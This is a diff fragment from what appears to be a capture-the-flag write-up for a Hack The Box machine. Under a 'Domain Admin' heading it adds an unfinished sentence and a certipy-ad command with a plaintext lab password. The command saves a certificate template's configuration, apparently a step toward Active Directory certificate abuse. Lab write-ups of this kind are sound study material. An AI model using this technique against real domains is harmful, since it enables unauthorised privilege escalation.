@@ -940,5 +940,13 @@ So with these two user accounts i can create computer accounts under a certain O
 
 # Domain Admin
 
+So the plan her
 
+```python
+❯❯❯ certipy-ad template -dc-ip 10.129.229.190 -dc-host dc01.coder.htb -target-ip 10.129.229.190 -target dc01.coder.htb -u e.black@coder.htb -p 'ypOSJXPqlDOxxbQSfEERy300' -template User -save-configuration User.json
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Saving current configuration to 'User.json'
+[*] Wrote current configuration for 'User' to 'User.json'
+```
 
